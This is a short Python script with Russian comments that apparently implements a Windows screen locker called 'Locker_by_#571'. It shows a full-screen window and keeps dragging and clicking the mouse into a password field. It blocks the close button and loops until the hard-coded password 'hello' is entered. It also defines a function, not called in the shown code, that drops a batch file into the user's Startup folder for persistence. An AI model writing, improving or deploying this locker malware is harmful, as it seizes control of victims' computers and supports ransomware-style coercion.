from tkinter import Tk, Entry, Label # окно, поля ввода, надписи в окне
from pyautogui import click, moveTo # блокирует мышку на окне полля ввода пароля(moveTo) и зажимает правую кнопку мыши (click)
from time import sleep # задержка по времени
import getpass
import os

USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path) 
def callback(event): #
	global k,entry # создаем глобальную переменную что можно было обратится к ней из любой строки кода
	if entry.get()=="hello": # условие для ввода пароля на идентичность 
		k = True #
def on_closing(): #
	click(675, 420) # кликается левая кнопка мыши (мешает пользователю)
	moveTo(675,420) # держит мышку в поле ввода(мешает пользователю)
	root.attributes("-fullscreen", True) # удерживает окно на одном месте не дает сдвинуть
	root.protocol("WM_DELETE_WINDOW", on_closing) # блокирует работу клавишь клавиатура для закрытия окна
	root.update() # обновляет окно
	root.bind('<Control-KeyPress-c>', callback) # назначаем комбинациб клавишь для перехода к функции callback
root = Tk() # создание окна
root.title("Locker") # заголовочное название
root.attributes("-fullscreen", True) # окно во весь экран без крестиков и свертования
entry = Entry(root, font=1) # поле ввода с размером шрифта 1
entry.place(width=150, height=50, x=600, y=400) # позиционирование окна для ввода пароля и размеры
lable0 = Label(root,text='Locker_by_#571', font=1) # в левом верхнем угле окна натпись
lable0.grid(row=0, column=0) # позиционирование натписи в левый верхний угол с помощью ячейки(№ ячейки 0)grid
lable1 = Label(root, text="Write the Password", font=5) # текст над полем ввода 
lable1.place(x=470, y=300) # позиционирование текста над полем ввода
root.update() # не дает возможности пользоателям пользоваться другими программами(обновление экрана программы )
sleep(0.2) # задержка времени чтобы сразу не запускались програмы pyautogui
click(675, 420) #
k = False # глобальной переменной присваеваем булевое значение 0
while k != True: # бесконечно запускает цикл  пока не введен правильный пароль
	on_closing() # вызов функции для закрытия окна при правельном введение пароляпароля